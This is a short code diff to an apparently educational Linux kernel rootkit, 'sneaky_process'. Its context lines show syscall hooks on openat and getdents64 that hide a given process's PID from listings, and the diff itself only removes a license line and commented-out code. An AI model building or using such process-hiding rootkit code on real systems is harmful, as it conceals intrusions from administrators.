@@ -14,7 +14,6 @@
 #define PREFIX "sneaky_process"
 
 // for hiding the pid
-MODULE_LICENSE("GPL");
 static int sneaky_pid = 0;
 module_param(sneaky_pid, int, 0);
 MODULE_PARM_DESC(sneaky_pid, "PID of the sneaky process");
@@ -80,7 +79,6 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 //     char       d_name[];
 // };
 
-
 asmlinkage int (*original_getdents64)(struct pt_regs *);
 
 asmlinkage int sneaky_sys_getdents64(struct pt_regs * regs)
@@ -98,13 +96,6 @@ asmlinkage int sneaky_sys_getdents64(struct pt_regs * regs)
   if (nread <= 0) {
     return nread;
   }
-
-  // snprintf(pid_str, sizeof(pid_str), "%d", sneaky_pid);
-
-  // // int nread = original_getdents64(regs);
-  // if (nread <= 0) {
-  //   return nread;
-  // }
 
   // use loop to check and hide the pid of sneaky process
   for (; bpos < nread;) {
